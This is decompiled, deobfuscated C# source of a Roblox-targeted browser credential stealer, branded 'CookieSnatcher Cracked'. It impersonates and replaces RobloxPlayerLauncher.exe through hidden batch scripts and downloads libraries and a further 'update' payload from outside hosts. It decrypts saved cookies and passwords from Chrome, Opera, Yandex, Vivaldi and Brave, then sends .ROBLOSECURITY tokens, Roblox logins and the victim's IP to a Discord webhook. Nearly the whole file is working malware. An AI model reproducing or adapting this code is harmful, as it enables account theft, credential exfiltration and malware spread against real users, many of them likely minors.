using System;
using System.Collections.Specialized;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

// Token: 0x02000003 RID: 3
internal class EntryPointClass
{
	// Token: 0x06000001 RID: 1 RVA: 0x0000231C File Offset: 0x0000051C
	private static void MsyUyJaON(string string_8)
	{
		new Process
		{
			StartInfo =
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				FileName = "cmd.exe",
				Arguments = "/c " + string_8
			}
		}.Start();
	}

	// Token: 0x06000002 RID: 2 RVA: 0x00002380 File Offset: 0x00000580
	private static string smethod_0()
	{
		if (!EntryPointClass.string_6.Contains(".exe"))
		{
			return EntryPointClass.string_6 = EntryPointClass.string_5 + "\\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.ModuleName) + ".exe";
		}
		return EntryPointClass.string_6;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000023D4 File Offset: 0x000005D4
	private static void smethod_1()
	{
		string text = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
		if (File.Exists(text))
		{
			string fileVersion = FileVersionInfo.GetVersionInfo(text.ToString()).FileVersion;
			string[] array = fileVersion.Split(new char[]
			{
				'.'
			});
			EntryPointClass.int_0 = int.Parse(array[0]);
			return;
		}
		EntryPointClass.bool_0 = false;
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00002428 File Offset: 0x00000628
	private static void Main(string[] args)
	{
		MessageBox.Show("Dumped by icor, deobfuscated by NTAuth. Entry point reached, dont go further if you dont want to get fucking infected by this sloppy code.");
		EntryPointClass.smethod_5();
		string text = Path.Combine(EntryPointClass.smethod_6(), "content", "updates");
		string text2 = Path.Combine(text, "RobloxPlayerLauncher.exe");
		if (Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()) == Path.Combine(EntryPointClass.smethod_6(), "RobloxPlayerLauncher.exe"))
		{
			EntryPointClass.smethod_10(EntryPointClass.smethod_4(args[0].Split(new char[]
			{
				':'
			})[3].Split(new char[]
			{
				'+'
			})[0]));
			new Process
			{
				StartInfo =
				{
					Arguments = args[0],
					FileName = text2
				}
			}.Start();
			return;
		}
		if (!Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()).Contains("Temp"))
		{
			if (!Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()).Contains("Roblox"))
			{
				if (!Directory.Exists(EntryPointClass.string_5))
				{
					try
					{
						Directory.CreateDirectory(EntryPointClass.string_5);
						Directory.CreateDirectory(EntryPointClass.string_5 + "\\x64");
						Directory.CreateDirectory(EntryPointClass.string_5 + "\\x86");
					}
					catch
					{
					}
				}
				if (File.Exists(EntryPointClass.string_5 + "\\System.Data.SQLite.dll"))
				{
					if (File.Exists(EntryPointClass.smethod_0()))
					{
						File.Delete(EntryPointClass.smethod_0());
					}
					EntryPointClass.smethod_2();
					return;
				}
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://ixware.biz/cs/1.bin", EntryPointClass.string_5 + "\\EntityFramework.dll");
				webClient.DownloadFile("https://ixware.biz/cs/2.bin", EntryPointClass.string_5 + "\\EntityFramework.SqlServer.dll");
				webClient.DownloadFile("https://ixware.biz/cs/3.bin", EntryPointClass.string_5 + "\\System.Data.SQLite.dll");
				webClient.DownloadFile("https://ixware.biz/cs/4.bin", EntryPointClass.string_5 + "\\System.Data.SQLite.EF6.dll");
				webClient.DownloadFile("https://ixware.biz/cs/5.bin", EntryPointClass.string_5 + "\\System.Data.SQLite.Linq.dll");
				webClient.DownloadFile("https://ixware.biz/cs/6.bin", EntryPointClass.string_5 + "\\BouncyCastle.Crypto.dll");
				webClient.DownloadFile("https://ixware.biz/cs/7.bin", EntryPointClass.string_5 + "\\Newtonsoft.Json.dll");
				webClient.DownloadFile("https://ixware.biz/cs/x64.bin", EntryPointClass.string_5 + "\\x64\\SQLite.Interop.dll");
				webClient.DownloadFile("https://ixware.biz/cs/x86.bin", EntryPointClass.string_5 + "\\x86\\SQLite.Interop.dll");
				webClient.Dispose();
				if (!File.Exists(text2) && File.Exists(EntryPointClass.smethod_7()))
				{
					EntryPointClass.smethod_3(text2, text);
					return;
				}
				EntryPointClass.smethod_2();
				return;
			}
		}
		else if (Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()) != Path.Combine(EntryPointClass.smethod_6(), "RobloxPlayerLauncher.exe"))
		{
			EntryPointClass.smethod_1();
			if (EntryPointClass.bool_0)
			{
				if (EntryPointClass.int_0 >= 80)
				{
					EntryPointClass.smethod_14();
					return;
				}
				try
				{
					EntryPointClass.smethod_18();
					return;
				}
				catch
				{
					return;
				}
			}
			try
			{
				EntryPointClass.smethod_18();
			}
			catch
			{
				EntryPointClass.smethod_14();
			}
		}
	}

	// Token: 0x06000005 RID: 5 RVA: 0x0000271C File Offset: 0x0000091C
	private static void smethod_2()
	{

		string tempPath = Path.GetTempPath();
		string text = Path.Combine(new string[]
		{
			tempPath + "csupdates.bat"
		});
		string value = "taskkill /PID /T /F " + Process.GetCurrentProcess().Id;
		string value2 = string.Concat(new string[]
		{
			"XCOPY /Y \"",
			Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()).ToString(),
			"\" \"",
			EntryPointClass.string_5,
			"\""
		});
		string value3 = "START /C \"" + EntryPointClass.smethod_0() + "\"";
		string value4 = "EXIT";
		try
		{
			if (!File.Exists(text))
			{
				FileStream fileStream = File.Create(text);
				fileStream.Close();
			}
			using (StreamWriter streamWriter = new StreamWriter(text, false))
			{
				streamWriter.WriteLine(value);
				streamWriter.WriteLine(value2);
				streamWriter.WriteLine(value3);
				streamWriter.WriteLine(value4);
			}
		}
		catch
		{
		}
		EntryPointClass.MsyUyJaON(text);
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002844 File Offset: 0x00000A44
	private static void smethod_3(string string_8, string string_9)
	{
		string tempPath = Path.GetTempPath();
		string text = Path.Combine(new string[]
		{
			tempPath + "csupdate.bat"
		});
		string value = "taskkill /PID /T /F " + Process.GetCurrentProcess().Id;
		string value2 = string.Concat(new string[]
		{
			"XCOPY /Y \"",
			Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()).ToString(),
			"\" \"",
			EntryPointClass.string_5,
			"\""
		});
		string value3 = string.Concat(new string[]
		{
			"XCOPY /Y \"",
			EntryPointClass.smethod_7(),
			"\" \"",
			string_9,
			"\""
		});
		string value4 = string.Concat(new string[]
		{
			"XCOPY /Y \"",
			Class4.PBaBSwF0biKAJ(Assembly.GetExecutingAssembly()).ToString(),
			"\" \"",
			Path.Combine(EntryPointClass.smethod_6(), "RobloxPlayerLauncher.exe"),
			"\""
		});
		string value5 = "START /C \"" + EntryPointClass.smethod_0() + "\"";
		string value6 = "EXIT";
		try
		{
			if (!File.Exists(string_8) && !Directory.Exists(string_9))
			{
				Directory.CreateDirectory(string_9);
			}
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(text))
			{
				FileStream fileStream = File.Create(text);
				fileStream.Close();
			}
			using (StreamWriter streamWriter = new StreamWriter(text, false))
			{
				streamWriter.WriteLine(value);
				streamWriter.WriteLine(value2);
				streamWriter.WriteLine(value3);
				streamWriter.WriteLine(value4);
				streamWriter.WriteLine(value5);
				streamWriter.WriteLine(value6);
			}
		}
		catch
		{
		}
		EntryPointClass.MsyUyJaON(text);
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00002A30 File Offset: 0x00000C30
	private static string smethod_4(object object_0)
	{
		string result;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string.Format("https://www.roblox.com/Login/Negotiate.ashx?suggest={0}", object_0));
			httpWebRequest.Headers.Add("RBXAuthenticationNegotiation", ": https://www.roblox.com");
			httpWebRequest.Headers.Add("RBX-For-Gameauth", "true");
			httpWebRequest.Method = "GET";
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				string input = httpWebResponse.Headers.Get("Set-Cookie");
				Regex regex = new Regex(".ROBLOSECURITY=(.*?);");
				Match match = regex.Match(input);
				result = match.Groups[1].Value;
			}
		}
		catch (WebException)
		{
			result = "Auth Ticket Expired";
		}
		return result;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002B04 File Offset: 0x00000D04
	private static string smethod_5()
	{
		string result;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://www.roblox.com/install/setup.ashx");
			httpWebRequest.AllowAutoRedirect = false;
			httpWebRequest.UserAgent = "Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 70.0.3538.77 Safari / 537.36";
			using (WebResponse response = httpWebRequest.GetResponse())
			{
				string text = response.Headers.ToString();
				EntryPointClass.string_7 = text;
			}
			int num = EntryPointClass.string_7.IndexOf("https://setup.rbxcdn.com/") + "https://setup.rbxcdn.com/".Length;
			int num2 = EntryPointClass.string_7.LastIndexOf("-Roblox.exe");
			string text2 = EntryPointClass.string_7.Substring(num, num2 - num);
			result = (EntryPointClass.string_7 = text2);
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000009 RID: 9 RVA: 0x00002BC8 File Offset: 0x00000DC8
	private static string smethod_6()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		return folderPath + "\\Roblox\\Versions\\" + EntryPointClass.string_7 + "\\";
	}

	// Token: 0x0600000A RID: 10 RVA: 0x00002BF4 File Offset: 0x00000DF4
	private static string smethod_7()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		string text = folderPath + "\\Roblox\\Versions\\" + EntryPointClass.string_7 + "\\RobloxPlayerLauncher.exe";
		if (File.Exists(text))
		{
			return text;
		}
		return null;
	}

	// Token: 0x0600000B RID: 11 RVA: 0x00002C2C File Offset: 0x00000E2C
	private static string pPtixUhvH()
	{
		string text = "abcdefghijklmnopqrstuvwxyz";
		char[] array = new char[6];
		Random random = new Random();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = text[random.Next(text.Length)];
		}
		return new string(array);
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00002C7C File Offset: 0x00000E7C
	private static void smethod_8(string string_8)
	{
		if (File.Exists(string_8))
		{
			string str = EntryPointClass.pPtixUhvH();
			string text = EntryPointClass.string_5 + "\\" + str + ".db";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(string_8, text);
			string text2 = string.Format("Data Source={0};", text);
			try
			{
				SQLiteConnection sqliteConnection = new SQLiteConnection(text2);
				sqliteConnection.Open();
				string text3 = "SELECT encrypted_value FROM cookies;";
				SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
				SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
				while (sqliteDataReader.Read())
				{
					string @string = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])sqliteDataReader["encrypted_value"], null, DataProtectionScope.CurrentUser));
					string[] array = new string[]
					{
						@string
					};
					foreach (string text4 in array)
					{
						if (text4.Contains("_|WARNING:-DO-NOT-SHARE-THIS."))
						{
							EntryPointClass.smethod_10(text4);
						}
					}
				}
				sqliteConnection.Close();
			}
			catch
			{
			}
		}
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002D88 File Offset: 0x00000F88
	private static void smethod_9(string string_8)
	{
		if (File.Exists(string_8))
		{
			string str = EntryPointClass.pPtixUhvH();
			string text = EntryPointClass.string_5 + "\\" + str + ".db";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(string_8, text);
			string text2 = string.Format("Data Source={0};Version=3;", text);
			try
			{
				SQLiteConnection sqliteConnection = new SQLiteConnection(text2);
				sqliteConnection.Open();
				string text3 = "SELECT action_url, username_value, password_value FROM logins;";
				SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
				SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
				while (sqliteDataReader.Read())
				{
					string text4 = (string)sqliteDataReader["action_url"];
					string text5 = (string)sqliteDataReader["username_value"];
					string @string = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])sqliteDataReader["password_value"], null, DataProtectionScope.CurrentUser));
					string[] array = new string[]
					{
						string.Concat(new string[]
						{
							text5,
							":!:",
							@string,
							":!:",
							text4
						})
					};
					foreach (string text6 in array)
					{
						if (text6.Contains("roblox"))
						{
							EntryPointClass.smethod_10(text6);
						}
					}
				}
				sqliteConnection.Close();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
		}
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002F2C File Offset: 0x0000112C
	private static void smethod_10(string string_8)
	{
		EntryPointClass.smethod_11(string_8);
		string a = EntryPointClass.smethod_13(EntryPointClass.string_4);
		if (a == "null")
		{
			return;
		}
		string path = Path.GetTempPath() + "up.txt";
		string fileName = Path.GetTempPath() + "update.exe";
		try
		{
			using (StreamWriter streamWriter = new StreamWriter(path, false))
			{
				streamWriter.WriteLine(EntryPointClass.string_4);
				streamWriter.Close();
			}
			using (WebClient webClient = new WebClient())
			{
				webClient.Proxy = null;
				webClient.DownloadFile("https://csnatcher.rokey.xyz/x/update.bin", fileName);
				webClient.Dispose();
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00003004 File Offset: 0x00001204
	public static string smethod_11(string string_8)
	{
		string str = Environment.UserName.ToString();
		string str2 = new WebClient().DownloadString("http://api.ipify.org/");
		string value = str + ":!:" + str2;
		string value2 = EntryPointClass.string_0;


		string result;
		try
		{
			using (dWebHook dcWeb = new dWebHook())
			{
				dcWeb.ProfilePicture = "https://ixware.biz/cs/cs.png";
				dcWeb.UserName = "CookieSnatcher Cracked";
				dcWeb.WebHook = "WEBHOOK HERE";
				dcWeb.SendMessage($"Cookie: {string_8}\r\n\r\nIP: {value}");
			}
			result = "gay";
		}
		catch
		{
			result = "false";
		}
		return result;
	}

	// Token: 0x06000010 RID: 16 RVA: 0x000030F4 File Offset: 0x000012F4
	public static bool smethod_12()
	{
		bool result;
		try
		{
			using (WebClient webClient = new WebClient())
			{
				using (webClient.OpenRead("http://clients3.google.com/generate_204"))
				{
					result = true;
				}
				webClient.Dispose();
			}
		}
		catch
		{
			Environment.Exit(0);
			result = false;
		}
		return result;
	}

	// Token: 0x06000011 RID: 17 RVA: 0x0000316C File Offset: 0x0000136C
	public static string smethod_13(string string_8)
	{
		byte[] bytes = Convert.FromBase64String(string_8);
		return Encoding.UTF8.GetString(bytes);
	}

	// Token: 0x06000012 RID: 18 RVA: 0x00003190 File Offset: 0x00001390
	private static void smethod_14()
	{
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome"))
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
				string[] files = Directory.GetFiles(path, "Cookies", SearchOption.AllDirectories);
				foreach (string string_ in files)
				{
					EntryPointClass.smethod_16(string_);
				}
			}
			catch
			{
			}
			try
			{
				string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
				string[] files2 = Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories);
				foreach (string string_2 in files2)
				{
					EntryPointClass.smethod_17(string_2);
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000013 RID: 19 RVA: 0x00003260 File Offset: 0x00001460
	private static string smethod_15(byte[] byte_0, byte[] byte_1, int int_1)
	{
		string @string;
		using (MemoryStream memoryStream = new MemoryStream(byte_0))
		{
			using (BinaryReader binaryReader = new BinaryReader(memoryStream))
			{
				binaryReader.ReadBytes(int_1);
				byte[] array = binaryReader.ReadBytes(12);
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
				AeadParameters aeadParameters = new AeadParameters(new KeyParameter(byte_1), 128, array);
				gcmBlockCipher.Init(false, aeadParameters);
				byte[] array2 = binaryReader.ReadBytes(byte_0.Length);
				byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(array2.Length)];
				try
				{
					int num = gcmBlockCipher.ProcessBytes(array2, 0, array2.Length, array3, 0);
					gcmBlockCipher.DoFinal(array3, num);
				}
				catch
				{
					return null;
				}
				@string = Encoding.Default.GetString(array3);
			}
		}
		return @string;
	}

	// Token: 0x06000014 RID: 20 RVA: 0x00003344 File Offset: 0x00001544
	private static void smethod_16(string string_8)
	{
		if (File.Exists(string_8))
		{
			try
			{
				string str = EntryPointClass.pPtixUhvH();
				string text = EntryPointClass.string_5 + "\\" + str + ".db";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_8, text);
				string text2 = string.Format("Data Source={0};Journal Mode=Off;", text);
				SQLiteConnection sqliteConnection = new SQLiteConnection(text2);
				sqliteConnection.Open();
				string text3 = "SELECT encrypted_value FROM cookies;";
				SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
				SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
				while (sqliteDataReader.Read())
				{
					byte[] byte_ = (byte[])sqliteDataReader["encrypted_value"];
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Local State");
					text4 = JObject.Parse(text4)["os_crypt"]["encrypted_key"].ToString();
					byte[] byte_2 = ProtectedData.Unprotect(Convert.FromBase64String(text4).Skip(5).ToArray<byte>(), null, DataProtectionScope.LocalMachine);
					string text5 = EntryPointClass.smethod_15(byte_, byte_2, 3);
					string[] array = new string[]
					{
						text5
					};
					foreach (string text6 in array)
					{
						if (text6.Contains("_|WARNING:-DO-NOT-SHARE-THIS."))
						{
							EntryPointClass.smethod_10(text6);
						}
					}
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000015 RID: 21 RVA: 0x000034AC File Offset: 0x000016AC
	private static void smethod_17(string string_8)
	{
		if (File.Exists(string_8))
		{
			try
			{
				string str = EntryPointClass.pPtixUhvH();
				string text = EntryPointClass.string_5 + "\\" + str + ".db";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_8, text);
				string text2 = string.Format("Data Source={0};Journal Mode=Off;", text);
				SQLiteConnection sqliteConnection = new SQLiteConnection(text2);
				sqliteConnection.Open();
				string text3 = "SELECT origin_url, username_value, password_value FROM logins;";
				SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
				SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
				while (sqliteDataReader.Read())
				{
					string text4 = (string)sqliteDataReader["origin_url"];
					string text5 = (string)sqliteDataReader["username_value"];
					byte[] byte_ = (byte[])sqliteDataReader["password_value"];
					string text6 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Local State");
					text6 = JObject.Parse(text6)["os_crypt"]["encrypted_key"].ToString();
					byte[] byte_2 = ProtectedData.Unprotect(Convert.FromBase64String(text6).Skip(5).ToArray<byte>(), null, DataProtectionScope.LocalMachine);
					string text7 = EntryPointClass.smethod_15(byte_, byte_2, 3);
					string[] array = new string[]
					{
						string.Concat(new string[]
						{
							text5,
							":!:",
							text7,
							":!:",
							text4
						})
					};
					foreach (string text8 in array)
					{
						if (text8.Contains("roblox"))
						{
							EntryPointClass.smethod_10(text8);
						}
					}
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00003668 File Offset: 0x00001868
	private static void smethod_18()
	{
		EntryPointClass.smethod_12();
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome"))
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
				string[] files = Directory.GetFiles(path, "Cookies", SearchOption.AllDirectories);
				foreach (string string_ in files)
				{
					EntryPointClass.smethod_8(string_);
				}
			}
			catch
			{
			}
			try
			{
				string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
				string[] files2 = Directory.GetFiles(path2, "Login Data", SearchOption.AllDirectories);
				foreach (string string_2 in files2)
				{
					EntryPointClass.smethod_9(string_2);
				}
			}
			catch
			{
			}
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Opera Software"))
		{
			try
			{
				string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Opera Software";
				string[] files3 = Directory.GetFiles(path3, "Cookies", SearchOption.AllDirectories);
				foreach (string string_3 in files3)
				{
					EntryPointClass.smethod_8(string_3);
				}
			}
			catch
			{
			}
			try
			{
				string path4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Opera Software";
				string[] files4 = Directory.GetFiles(path4, "Login Data", SearchOption.AllDirectories);
				foreach (string string_4 in files4)
				{
					EntryPointClass.smethod_9(string_4);
				}
			}
			catch
			{
			}
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex"))
		{
			try
			{
				string path5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex";
				string[] files5 = Directory.GetFiles(path5, "Cookies", SearchOption.AllDirectories);
				foreach (string string_5 in files5)
				{
					EntryPointClass.smethod_8(string_5);
				}
			}
			catch
			{
			}
			try
			{
				string path6 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex";
				string[] files6 = Directory.GetFiles(path6, "Login Data", SearchOption.AllDirectories);
				foreach (string string_6 in files6)
				{
					EntryPointClass.smethod_9(string_6);
				}
			}
			catch
			{
			}
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi"))
		{
			try
			{
				string path7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi";
				string[] files7 = Directory.GetFiles(path7, "Cookies", SearchOption.AllDirectories);
				foreach (string string_7 in files7)
				{
					EntryPointClass.smethod_8(string_7);
				}
			}
			catch
			{
			}
			try
			{
				string path8 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi";
				string[] files8 = Directory.GetFiles(path8, "Login Data", SearchOption.AllDirectories);
				foreach (string string_8 in files8)
				{
					EntryPointClass.smethod_9(string_8);
				}
			}
			catch
			{
			}
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware"))
		{
			try
			{
				string path9 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware";
				string[] files9 = Directory.GetFiles(path9, "Cookies", SearchOption.AllDirectories);
				foreach (string string_9 in files9)
				{
					EntryPointClass.smethod_8(string_9);
				}
			}
			catch
			{
			}
			try
			{
				string path10 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware";
				string[] files10 = Directory.GetFiles(path10, "Login Data", SearchOption.AllDirectories);
				foreach (string string_10 in files10)
				{
					EntryPointClass.smethod_9(string_10);
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000017 RID: 23 RVA: 0x000022BC File Offset: 0x000004BC
	public EntryPointClass()
	{
		Class3.q1CBSw8zt8A0W();
	}

	// Token: 0x06000018 RID: 24 RVA: 0x00003A70 File Offset: 0x00001C70
	static EntryPointClass()
	{
		Class3.q1CBSw8zt8A0W();
		EntryPointClass.string_0 = "eW91IGFuZCB5b3VyIHVzZWxlc3MgdGVhbSBtZXNzZWQgdXAgd2l0aCB0aGUgc3R1YnMuIGNvbmdyYXRzIGZhZ3MhIC1udC4gYWxzbyBORVQgUkVBQ1RPUiBJUyBGVUNLSU5HIFVTRUxFU1MgWU9VIEZBVCBHQVkgS0lELg==";
		EntryPointClass.string_1 = "B097F1C0AA17E";
		EntryPointClass.string_2 = "true";
		EntryPointClass.MsOvdKdwf = "eW91ciBub3Qgc21hcnQ/";
		EntryPointClass.string_3 = "c3RpbGwgbm90IHNtYXJ0";
		EntryPointClass.string_4 = "bWluZCB5b3VyIG93biA+YnVzaW5lc3M8";
		EntryPointClass.bool_0 = true;
		EntryPointClass.string_5 = Path.GetTempPath() + "InstantUpdate";
		EntryPointClass.string_6 = EntryPointClass.string_5 + "\\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.ModuleName);
		EntryPointClass.int_0 = 1;
	}

	// Token: 0x04000001 RID: 1
	private static string string_0;

	// Token: 0x04000002 RID: 2
	private static string string_1;

	// Token: 0x04000003 RID: 3
	private static string string_2;

	// Token: 0x04000004 RID: 4
	private static string MsOvdKdwf;

	// Token: 0x04000005 RID: 5
	private static string string_3;

	// Token: 0x04000006 RID: 6
	private static string string_4;

	// Token: 0x04000007 RID: 7
	private static bool bool_0;

	// Token: 0x04000008 RID: 8
	private static string string_5;

	// Token: 0x04000009 RID: 9
	private static string string_6;

	// Token: 0x0400000A RID: 10
	private static int int_0;

	// Token: 0x0400000B RID: 11
	private static string string_7;
}


public class dWebHook : IDisposable
{
	private readonly WebClient dWebClient;
	private static NameValueCollection discordValues = new NameValueCollection();
	public string WebHook { get; set; }
	public string UserName { get; set; }
	public string ProfilePicture { get; set; }

	public dWebHook()
	{
		dWebClient = new WebClient();
	}


	public void SendMessage(string msgSend)
	{
		discordValues.Add("username", UserName);
		discordValues.Add("avatar_url", ProfilePicture);
		discordValues.Add("content", msgSend);

		dWebClient.UploadValues(WebHook, discordValues);
	}

	public void Dispose()
	{
		dWebClient.Dispose();
	}
}